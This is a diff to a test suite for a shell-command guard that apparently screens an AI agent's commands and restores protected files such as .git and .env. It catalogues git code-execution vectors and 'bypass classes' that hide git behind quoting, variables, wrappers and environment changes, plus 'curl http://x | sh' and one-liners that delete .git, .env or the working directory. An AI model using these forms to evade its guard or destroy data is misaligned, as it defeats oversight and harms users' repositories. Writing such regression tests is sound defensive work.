@@ -144,6 +144,57 @@ const EXEC_FORMS = [
   { id: 'find -exec', cmd: () => `find . -exec ./p.sh {} ;` },
   { id: 'find -execdir', cmd: () => `find . -execdir ./p.sh {} +` },
   { id: 'find -ok', cmd: () => `find . -ok ./p.sh {} ;` },
+  // ── r5 B: fixed list additions ──
+  { id: 'git --exec-path=', cmd: () => `git --exec-path=/tmp/d x` },
+  { id: 'git difftool -x', cmd: () => `git difftool -y -x ./p.sh` },
+  { id: 'git difftool --extcmd=', cmd: () => `git difftool --extcmd=./p.sh` },
+  // ── r5 C1: non-literal command name ──
+  { id: 'C1 g"it"', cmd: () => `g"it" -c alias.x=!./p.sh x` },
+  { id: "C1 gi''t", cmd: () => `gi''t -c alias.x=!./p.sh x` },
+  { id: "C1 bash -c $'git'", cmd: () => `bash -c "\\$'git' -c alias.x='!./p.sh' x"` },
+  { id: 'C1 $G', cmd: () => `G=git; $G -c alias.x=!./p.sh x` },
+  { id: 'C1 \\git', cmd: () => `\\git -c core.pager=./p.sh log` },
+  { id: 'C1 $(…) name', cmd: () => `$(echo git) status` },
+  { id: 'C1 glob name', cmd: () => `/usr/bin/gi? status` },
+  { id: 'C1 pwsh & (…)', cmd: () => `& ('g'+'it') status` },
+  // ── r5 C1/C2: here-string / here-doc / stdin into a shell ──
+  { id: 'C2 bash here-string', cmd: () => `bash -c 'bash <<< "git -c alias.x=!./p.sh x"'` },
+  { id: 'C2 here-doc into sh', cmd: () => `sh <<EOF\ngit status\nEOF` },
+  { id: 'C2 curl | sh', cmd: () => `curl -s http://x | sh` },
+  // ── r5 C2: wrapper / unknown prefix before git ──
+  { id: 'C2 timeout git', cmd: () => `timeout 10 git status` },
+  { id: 'C2 sh -c git', cmd: () => `sh -c 'git log -3'` },
+  { id: 'C2 xargs git', cmd: () => `echo x | xargs git log` },
+  {
+    id: 'C2 flock git + GIT_SSH_COMMAND',
+    cmd: () => `GIT_SSH_COMMAND=./p.sh flock lk git ls-remote ssh://h/r`,
+  },
+  { id: 'C2 setpriv git', cmd: () => `setpriv git status` },
+  { id: 'C2 pwsh -c git', cmd: () => `pwsh -NoProfile -c "git status"` },
+  { id: 'C2 cmd /c git', cmd: () => `cmd /c git status` },
+  // ── r5 C3: env change then git ──
+  {
+    id: 'C3 set -a then git',
+    cmd: () => `set -a; GIT_SSH_COMMAND=./p.sh; git ls-remote ssh://h/r`,
+  },
+  { id: 'C3 export then git', cmd: () => `export FOO=1; git status` },
+  { id: 'C3 source then git', cmd: () => `source ./env.sh; git status` },
+  { id: 'C3 PATH= then git', cmd: () => `PATH=.:$PATH; git status` },
+  { id: 'C3/N6 pwsh $env: spaced', cmd: () => `$env:GIT_CONFIG_GLOBAL = 'e'; git x` },
+  {
+    id: 'C3/N6 pwsh $env:SSH spaced',
+    cmd: () => `$env:GIT_SSH_COMMAND = './p.sh'; git ls-remote x`,
+  },
+  {
+    id: 'C3/N8 [Environment]::SetEnvironmentVariable',
+    cmd: () => `[Environment]::SetEnvironmentVariable('GIT_CONFIG_GLOBAL','e'); git x`,
+  },
+  { id: 'C3 cmd set X= then git', cmd: () => `set GIT_PAGER=./p.sh&& git log` },
+  // ── r5 C4: uncommon git global option ──
+  { id: 'C4 --git-dir', cmd: () => `git --git-dir=/tmp/x status` },
+  { id: 'C4 --work-tree', cmd: () => `git --work-tree=/tmp status` },
+  { id: 'C4 -p paginate', cmd: () => `git -p log` },
+  { id: 'C4 --namespace', cmd: () => `git --namespace=x log` },
 ];
 
 const jobs = [];
@@ -177,7 +228,49 @@ const GREEN_POLICY = [
   'git log -3',
   `git -C ${q(R)} status`,
   'git show HEAD --stat',
+  // r5 C over-block guard: plain git / quoted args / text heads / J12/J13/B1.
+  'git status',
+  'git commit -m "x"',
+  "git commit -m 'fix: a b'",
+  'echo "git"',
+  'echo git',
+  'npm test',
+  'node -e 1',
+  `node -e "console.log(['1h30m'].join())"`,
+  'ls',
+  'ls -la',
+  'rg -n "git -c" .',
+  `git diff --stat -- README.md && echo "unchanged: $(git diff --quiet -- README.md && echo yes)"`,
+  `node -e 1 && git -C ${q(R)} diff`,
+  `node -e 1; ls ${q(R)}`,
+  `git -C ${q(R)} log --oneline | tail -3; node -e 1`,
+  `ls -la ${q(R)}; ls -la ${q(R)}/src; which colcon ros2 python3; python3 -V`,
+  'GIT_TERMINAL_PROMPT=0 git status',
+  'GIT_AUTHOR_NAME=x git commit --allow-empty -m t',
+  'timeout 10 npm test',
+  'env FOO=1 node -e 1',
+  'echo README.md | xargs grep -n p',
+  'command -v git',
+  'git --version',
+  'git --no-pager log -1',
+  'if git diff --quiet; then echo same; fi',
+  'echo hi | sh',
 ];
+// r5 C: uncertain forms apply only inside a git repository.
+{
+  const NG = path.join(base, 'not-git');
+  fs.mkdirSync(NG, { recursive: true });
+  const ngCtx = { ...ctx, cwd: NG, workspaceRoot: NG };
+  for (const raw of [`G=git; $G status`, `timeout 10 git status`, `export FOO=1; git status`]) {
+    jobs.push({
+      name: `policy GREEN non-git dir: ${raw}`,
+      fn: async () => {
+        const hits = findShellProtectedWrites(raw, ngCtx).filter((h) => h.kind === 'exec-capable');
+        assert.deepEqual(hits, [], raw);
+      },
+    });
+  }
+}
 for (const raw of GREEN_POLICY) {
   for (const pos of ['alone', 'cd']) {
     const cmd = pos === 'alone' ? raw : `cd ${q(R)} && ${raw}`;
@@ -475,6 +568,34 @@ function markerProbeScript(dir) {
   return script;
 }
 
+/**
+ * Each case runs with cwd = proj and (QA r3 T1) WITHOUT `git -C proj`, so the
+ * O151 workspace-root rule does not block it first: with the O152 detector
+ * reverted these run the probe (marker) and finish exit 0 — revert-red.
+ * `win` is the pwsh-valid equivalent (QA r3 T2); a case without one is an
+ * explicit SKIP on Windows with its reason (never a silent `continue`).
+ */
+const NODE_WRAP = 'o152-wrap.js';
+function prepareProbes({ root }) {
+  const script = markerProbeScript(root);
+  // git --exec-path=<dir> x → runs <dir>/git-x (N5).
+  const execDir = path.join(root, 'execdir');
+  fs.mkdirSync(execDir, { recursive: true });
+  fs.writeFileSync(path.join(execDir, 'git-x'), `#!/bin/sh\nexec ${q(script)}\n`, {
+    mode: 0o755,
+  });
+  // Unknown prefix that runs its argv (N4), portable via node.
+  fs.writeFileSync(
+    path.join(root, NODE_WRAP),
+    "const r=require('child_process').spawnSync(process.argv[2],process.argv.slice(3),{stdio:'inherit'});process.exit(r.status??1);\n"
+  );
+  // difftool -x needs two differing files (N7).
+  fs.writeFileSync(path.join(root, 'a.txt'), 'a\n');
+  fs.writeFileSync(path.join(root, 'b.txt'), 'b\n');
+  return script;
+}
+const SSH_URL = 'ssh://o152.invalid/r';
+
 const PROC_BLOCK = [
   {
     id: 'RG1 alone rg --pre',
@@ -497,70 +618,119 @@ const PROC_BLOCK = [
   {
     id: 'GIT_EXTERNAL_DIFF=',
     cmd: ({ proj, script }) => `GIT_EXTERNAL_DIFF=${q(script)} git -C ${q(proj)} diff; node -e 1`,
+    win: ({ proj, script }) =>
+      `$env:GIT_EXTERNAL_DIFF=${q(script)}; git -C ${q(proj)} diff; node -e 1`,
   },
   {
     id: 'git diff --ext-diff',
     cmd: ({ proj }) => `cd ${q(proj)} && git diff --ext-diff; node -e 1`,
   },
+  // ── r3 C / F1b: git -c and GIT_CONFIG_* in cwd (no -C) ──
   {
     id: 'git -c core.pager',
-    cmd: ({ proj, script }) => `git -C ${q(proj)} -c core.pager=${q(script)} log; node -e 1`,
+    cmd: ({ script }) => `git -c core.pager=${q(script)} log; node -e 1`,
   },
   {
     id: 'git -c credential.helper',
-    cmd: ({ proj, script }) =>
-      `git -C ${q(proj)} -c credential.helper='!${script}' credential fill; node -e 1`,
+    cmd: ({ script }) =>
+      `git -c credential.helper='!${script}' credential fill < ${q(NULL_IN)}; node -e 1`,
+    win: ({ script }) => `git -c credential.helper='!${script}' credential fill; node -e 1`,
   },
   {
     id: 'git -c core.askPass',
-    cmd: ({ proj, script }) => `git -C ${q(proj)} -c core.askPass=${q(script)} status; node -e 1`,
+    cmd: ({ script }) => `git -c core.askPass=${q(script)} status; node -e 1`,
   },
   {
     id: 'git -c include.path',
-    cmd: ({ proj, script, root }) => {
+    cmd: ({ script, root }) => {
       const cfg = path.join(root, 'evil.gitconfig');
       fs.writeFileSync(cfg, `[alias]\n\tx = !${script}\n`);
-      return `git -C ${q(proj)} -c include.path=${q(cfg)} x; node -e 1`;
+      return `git -c include.path=${q(cfg)} x; node -e 1`;
     },
   },
   {
     id: 'GIT_CONFIG_GLOBAL= evil alias',
-    cmd: ({ proj, script, root }) => {
+    cmd: ({ script, root }) => {
       const cfg = path.join(root, 'evil-global.gitconfig');
       fs.writeFileSync(cfg, `[alias]\n\tx = !${script}\n`);
-      return `GIT_CONFIG_GLOBAL=${q(cfg)} git -C ${q(proj)} x; node -e 1`;
+      return `GIT_CONFIG_GLOBAL=${q(cfg)} git x; node -e 1`;
+    },
+    win: ({ script, root }) => {
+      const cfg = path.join(root, 'evil-global.gitconfig');
+      fs.writeFileSync(cfg, `[alias]\n\tx = !${script}\n`);
+      // N6: pwsh assignment with spaces.
+      return `$env:GIT_CONFIG_GLOBAL = ${q(cfg)}; git x; node -e 1`;
     },
   },
   {
-    id: 'nice -n 5 git -c credential.helper',
-    cmd: ({ proj, script }) =>
-      `nice -n 5 git -C ${q(proj)} -c credential.helper='!${script}' credential fill; node -e 1`,
+    id: 'nice -n 5 git -c alias',
+    cmd: ({ script }) => `nice -n 5 git -c alias.x='!${script}' x; node -e 1`,
+    win: ({ script }) => `cmd /c "git -c alias.x=!${script} x"; node -e 1`,
   },
   {
-    id: 'timeout 10 git -c credential.helper',
-    cmd: ({ proj, script }) =>
-      `timeout 10 git -C ${q(proj)} -c credential.helper='!${script}' status; node -e 1`,
+    id: 'timeout 10 git -c alias',
+    cmd: ({ script }) => `timeout 10 git -c alias.x='!${script}' x; node -e 1`,
+    win: ({ script }) => `pwsh -NoProfile -c "git -c alias.x='!${script}' x"; node -e 1`,
   },
   {
-    id: 'sh -c git -c credential.helper',
-    cmd: ({ proj, script }) =>
-      `sh -c 'git -C ${q(proj)} -c credential.helper="!${script}" status'; node -e 1`,
+    id: 'sh -c git -c alias',
+    cmd: ({ script }) => `sh -c 'git -c alias.x="!${script}" x'; node -e 1`,
+    win: ({ script }) =>
+      `powershell -NoProfile -Command "git -c alias.x='!${script}' x"; node -e 1`,
   },
   {
-    id: 'bash -c git -c credential.helper',
-    cmd: ({ proj, script }) =>
-      `bash -c 'git -C ${q(proj)} -c credential.helper="!${script}" status'; node -e 1`,
+    id: 'bash -c git -c alias',
+    cmd: ({ script }) => `bash -c 'git -c alias.x="!${script}" x'; node -e 1`,
+    win: ({ script }) => `cmd /c git -c alias.x=!${script} x; node -e 1`,
+  },
+  // ── r5 C: QA r3 six bypass classes (one case each) ──
+  {
+    id: 'N1 g"it" non-literal name',
+    cmd: ({ script }) => `g"it" -c alias.x='!${script}' x; node -e 1`,
+    win: ({ script }) => `& ('g'+'it') -c alias.x='!${script}' x; node -e 1`,
+  },
+  {
+    id: 'N1 $G variable name',
+    cmd: ({ script }) => `G=git; $G -c alias.x='!${script}' x; node -e 1`,
+    win: ({ script }) => `$G='git'; & $G -c alias.x='!${script}' x; node -e 1`,
+  },
+  {
+    id: 'N2 bash here-string',
+    cmd: ({ script }) => `bash -c 'bash <<< "git -c alias.x=!${script} x"'; node -e 1`,
+    skipWin: 'bash here-string is POSIX-only; the pwsh/cmd nested forms are covered above',
+  },
+  {
+    id: 'N3 set -a then git',
+    cmd: ({ script }) =>
+      `set -a; GIT_SSH_COMMAND=${q(script)}; git ls-remote ${SSH_URL}; node -e 1`,
+    win: ({ script }) => `$env:GIT_SSH_COMMAND = ${q(script)}; git ls-remote ${SSH_URL}; node -e 1`,
+  },
+  {
+    id: 'N4 unknown prefix + GIT_SSH_COMMAND',
+    cmd: ({ script, root }) =>
+      `GIT_SSH_COMMAND=${q(script)} node ${q(path.join(root, NODE_WRAP))} git ls-remote ${SSH_URL}; node -e 1`,
+    win: ({ script, root }) =>
+      `$env:GIT_SSH_COMMAND=${q(script)}; node ${q(path.join(root, NODE_WRAP))} git ls-remote ${SSH_URL}; node -e 1`,
+  },
+  {
+    id: 'N5 git --exec-path',
+    cmd: ({ root }) => `git --exec-path=${q(path.join(root, 'execdir'))} x; node -e 1`,
+  },
+  {
+    id: 'N7 git difftool -x',
+    cmd: ({ script, root }) =>
+      `git difftool -y -x ${q(script)} --no-index ${q(path.join(root, 'a.txt'))} ${q(path.join(root, 'b.txt'))}; node -e 1`,
   },
 ];
+const NULL_IN = IS_WIN ? 'NUL' : '/dev/null';
 
-const PROC_BLOCK_UNIX_ONLY = new Set([
-  'nice -n 5 git -c credential.helper',
-  'timeout 10 git -c credential.helper',
-  'sh -c git -c credential.helper',
-  'bash -c git -c credential.helper',
-]);
+const skipped = [];
 for (const p of PROC_BLOCK) {
-  if (IS_WIN && PROC_BLOCK_UNIX_ONLY.has(p.id)) continue;
+  if (IS_WIN && p.skipWin) {
+    skipped.push(`proc BLOCK ${p.id}: ${p.skipWin}`);
+    continue;
+  }
+  const cmdFor = IS_WIN && p.win ? p.win : p.cmd;
   for (const lang of ['zh', 'en']) {
     for (const json of [false, true]) {
       jobs.push({
@@ -572,12 +742,10 @@ for (const p of PROC_BLOCK) {
             seed: SEED,
             modes: MODES,
             watch: WATCH,
-            prepare: ({ root }) => {
-              markerProbeScript(root);
-            },
+            prepare: prepareProbes,
             steps: ({ proj, root }) => {
               const script = path.join(root, 'o152-pre.sh');
-              return [exec(p.cmd({ proj, script, root }))];
+              return [exec(cmdFor({ proj, script, root }))];
             },
             finalText: CLAIM[lang],
             inspect: ({ root }) => ({
@@ -635,13 +803,16 @@ const RESTORE_CASES = [
     cmd: () => `node -e "require('fs').rmSync('.g'+'it',{recursive:true})"`,
   },
   {
-    // Wipe workspace *contents* (not cwd itself). On Windows, rmSync(cwd) throws
-    // EBUSY while the process holds the directory — nothing changes → exit 0.
-    // Deleting children still removes .git / .env and exercises L3 restore on
-    // every platform (Linux/mac keep the same protected-path outcome).
+    // QA r3 T3: the original RG3 — delete the whole cwd. On Windows the final
+    // rmdir(cwd) throws EBUSY with a long stack; with F9b the L3 result is a
+    // structured field, so that output no longer hides the exit 9.
     id: 'RG3 rmSync(cwd)',
+    cmd: () => `node -e "require('fs').rmSync(process.cwd(),{recursive:true,force:true})"`,
+  },
+  {
+    id: 'RG3b wipe cwd children',
     cmd: () =>
-      `node -e "const fs=require('fs'),p=require('path');const c=process.cwd();for(const n of fs.readdirSync(c)){try{fs.rmSync(p.join(c,n),{recursive:true,force:true})}catch(e){}}"`,
+      `node -e "const fs=require('fs'),p=require('path');const c=process.cwd();for(const n of fs.readdirSync(c))fs.rmSync(p.join(c,n),{recursive:true,force:true})"`,
   },
 ];
 
@@ -752,6 +923,53 @@ for (const lang of ['zh', 'en']) {
   });
 }
 
+// ── O152 r5 A / acceptance #12 (F9b): L3 result is independent of output size ─
+const BIG_OUT = [
+  ['1KB', 1024],
+  ['10KB', 10 * 1024],
+  ['1MB', 1024 * 1024],
+];
+const F9B_KINDS = [
+  { id: 'modified .git/config', act: `require('fs').writeFileSync('.g'+'it/config','x')` },
+  { id: 'deleted .env', act: `require('fs').rmSync('.e'+'nv')` },
+  { id: 'whole .git deleted', act: `require('fs').rmSync('.g'+'it',{recursive:true,force:true})` },
+];
+for (const [size, n] of BIG_OUT) {
+  for (const k of F9B_KINDS) {
+    for (const [lang, json] of [
+      ['zh', false],
+      ['en', true],
+    ]) {
+      jobs.push({
+        name: `proc F9b [${lang}${json ? '/json' : ''}] ${size} output then ${k.id}: exit 9`,
+        fn: async () => {
+          const r = await o152Scenario({
+            lang,
+            json,
+            seed: SEED,
+            modes: MODES,
+            watch: WATCH,
+            steps: () => [exec(`node -e "process.stdout.write('x'.repeat(${n}));${k.act}"`)],
+            finalText: CLAIM[lang],
+          });
+          assert.equal(r.code, 9, `exit 9, got ${r.code}; last=${String(r.last).slice(0, 200)}`);
+          if (json) {
+            assert.equal(r.result?.subtype, 'error_during_execution');
+            assert.equal(resultClaimsDone(r.result?.result), false);
+          } else {
+            assert.match(r.last, /^未完成/, r.last.slice(0, 200));
+            assert.match(r.last, /已被修改，已还原|未还原/, r.last.slice(0, 300));
+          }
+          for (const rel of WATCH) {
+            assert.equal(r.after[rel].hash, r.before[rel].hash, `${rel} hash`);
+          }
+          assert.equal(r.gitStatus, 0, 'git status works after restore');
+        },
+      });
+    }
+  }
+}
+
 // ── process GREEN: plain reads still complete ────────────────────────────
 const PROC_GREEN = [
   { id: 'rg -n', cmd: ({ proj }) => `rg -n foo ${q(proj)} || true` },
@@ -798,7 +1016,8 @@ for (const g of PROC_GREEN) {
 
 await runAll(jobs, 4);
 fs.rmSync(base, { recursive: true, force: true });
-console.log(`\n${pass} passed, ${failures.length} failed`);
+for (const s of skipped) console.log(`# SKIP ${s}`);
+console.log(`\n${pass} passed, ${failures.length} failed, ${skipped.length} skipped`);
 for (const f of failures) {
   console.error('\nFAIL', f.name);
   console.error(f.err);
